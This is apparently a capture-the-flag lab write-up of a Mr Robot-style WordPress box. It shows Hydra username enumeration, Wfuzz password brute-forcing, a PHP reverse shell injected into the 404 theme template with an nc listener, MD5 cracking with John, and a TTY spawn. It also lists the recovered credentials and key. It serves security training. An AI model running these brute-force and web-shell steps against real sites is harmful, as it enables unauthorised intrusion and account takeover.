
# Exploiting the fsociety.dic File and Gaining Access

## 1. Extracting and Sorting the Dictionary File

After discovering a directory in the **robots.txt** file, we found a dictionary file named `fsocity.dic`. To analyze its contents:

1. Copy the `fsocity.dic` file to the local machine.
    
2. Save it as a new file.
    
3. Use terminal commands to remove duplicates:

    ```bash
    grep -oE '[a-zA-Z]+' fsocity.txt | sort | uniq > f.txt
    ```

	This sorts the file and removes duplicate entries.

![[key2_photo1.png]]
![[key2_photo2.png]]
---

## 2. Checking Directories and Login Page

Using **gobuster**, we discovered multiple directories and decided to check **/wp-admin**.

On accessing `/wp-admin`, a login page appeared. The website displays "Invalid username" if an incorrect username is entered, allowing us to brute-force the correct username.
![[key2_photo3.png]]
![[key2_photo4.png]]
---

## 3. Brute-Forcing Username and Password

### Finding the Username

We used **Hydra** to brute-force the username:

```bash
hydra -L f.txt -p test 10.10.164.176 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
```

This revealed the usernames: **ELLIOT, Elliot**.
![[key2_photo5.png]]

![[key2_photo6.png]]

### Finding the Password

Using **Wfuzz** to brute-force the password:

```bash
wfuzz -c -z file,f.txt -d "log=ELLIOT&pwd=FUZZ" http://10.10.117.182/wp-login.php
```

Password found: **ER28-0652**.
![[key2_photo7.png]]
![[key2_photo8.png]]
---

## 4. Gaining a Reverse Shell

### Steps:

1. Download the **pentestmonkey** PHP reverse shell script:
    
    ```
    https://github.com/pentestmonkey/php-reverse-shell.git
    ```
    
2. Modify the IP and port (4444) in the script.
3. Inject the script inside: **Appearances -> Editor -> 404 Template**.
4. Update the template with the script.
5. Start a listener on the attack machine:
    
    ```bash
    nc -lvnp 4444
    ```
    
6. Trigger the shell by accessing:
    
    ```
    http://10.10.117.182/wp-admin/page=45
    ```
    
    This executes the 404 template, launching the reverse shell.
![[key2_photo9.png]]
![[key2_photo10.png]]
---![[key2_photo11.png]]
![[key2_photo12.png]]

![[key2_photo13.png]]
## 5. Privilege Escalation

### Accessing the Robot Directory

Once inside, navigate to the **robot** directory:

```bash
cd /home/robot
```

Inside, there are two files:

1. A password file containing an MD5 hash.
2. A key file, but access is denied.

![[key2_photo14.png]]

### Cracking the Password

Extract the hash and crack it using **John the Ripper**:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt password.hash
```

Cracked password: **abcdefghijklmnopqrstuvwxyz**

![[key2_photo15.png]]

### Switching to Robot User

Attempting to switch users:

```bash
su robot
```

If a terminal error occurs, spawn a TTY shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Enter the cracked password, granting access to the **robot** user.

![[key2_photo16.png]]

### Retrieving the Second Key

Now, access the restricted file and retrieve the key:

```bash
cat key-2-of-3.txt
```

**Key 2:** `822c73956184f694993bede3eb39f959`
![[key2_photo17.png]]

---

## Conclusion

We successfully exploited the system by:

- Extracting and cleaning the dictionary file.
- Brute-forcing login credentials.
- Injecting a reverse shell.
- Elevating privileges and retrieving the second key.

Next, we can explore further to gain root access.







